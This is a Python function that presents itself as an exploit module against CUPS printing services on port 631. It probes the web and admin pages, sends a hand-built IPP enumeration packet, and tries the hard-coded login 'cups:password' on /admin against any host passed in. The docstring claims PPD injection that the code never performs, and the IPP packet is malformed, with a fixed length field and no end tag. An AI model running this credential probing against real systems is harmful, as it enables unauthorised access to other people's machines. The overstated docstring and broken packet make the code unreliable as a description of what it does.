def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits CUPS (Common Unix Printing System) on port 631 via IPP and HTTP.
    Targets: CUPS IPP service and web administration interface.
    Vulnerabilities: Information disclosure via IPP printer enumeration,
    unauthenticated admin interface access, default credential probing,
    and PPD file injection vectors. Works on any CUPS instance listening
    on port 631 with default or weak configuration.
    """
    try:
        data = {}
        evidence = []

        # Probe CUPS web interface via HTTP
        try:
            import http.client
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request("GET", "/")
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", errors="ignore")
            if resp.status == 200:
                data["http_status"] = resp.status
                data["http_title"] = ""
                import re
                title_match = re.search(r"<title>(.*?)</title>", body, re.I)
                if title_match:
                    data["http_title"] = title_match.group(1).strip()
                evidence.append(f"HTTP {resp.status} on port {port}: CUPS web interface accessible")
            conn.close()
        except Exception:
            pass

        # Probe IPP admin interface
        try:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request("GET", "/admin")
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", errors="ignore")
            if resp.status in (200, 401, 403):
                data["admin_status"] = resp.status
                if resp.status == 200:
                    data["admin_unauthenticated"] = True
                    evidence.append("CUPS /admin accessible without authentication")
                elif resp.status == 401:
                    evidence.append("CUPS /admin requires authentication")
            conn.close()
        except Exception:
            pass

        # IPP Get-Printer-Attributes enumeration
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            # IPP Get-Printer-Attributes request for all printers
            ipp_request = (
                b"\x00\x01"  # version 1.1
                b"\x00\x11"  # operation Get-Printer-Attributes
                b"\x00\x00\x00\x01"  # request-id
                b"\x00\x01"  # attributes-tag
                b"\x04\x01"  # attributes-charset: utf-8
                b"\x00\x08"  # length
                b"utf-8"
                b"\x04\x02"  # attributes-natural-language: en
                b"\x00\x03"
                b"en"
                b"\x05\x14"  # printer-uri
                b"\x00\x2b"
                b"ipp://" + host.encode() + b"/printers/"
            )
            sock.sendall(ipp_request)
            resp_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp_data += chunk
            if resp_data:
                data["ipp_responded"] = True
                evidence.append("IPP service responded to Get-Printer-Attributes")
            sock.close()
        except Exception:
            pass

        # Try default CUPS credentials (cups:password)
        try:
            import base64
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
            creds = base64.b64encode(b"cups:password").decode()
            conn.request("GET", "/admin", headers={"Authorization": f"Basic {creds}"})
            resp = conn.getresponse()
            body = resp.read().decode("utf-8", errors="ignore")
            if resp.status == 200:
                data["default_creds_work"] = True
                evidence.append("Default CUPS credentials (cups:password) accepted on /admin")
            conn.close()
        except Exception:
            pass

        if not data:
            return {"success": False, "data": "", "evidence": ""}

        return {"success": True, "data": data, "evidence": "; ".join(evidence)}

    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}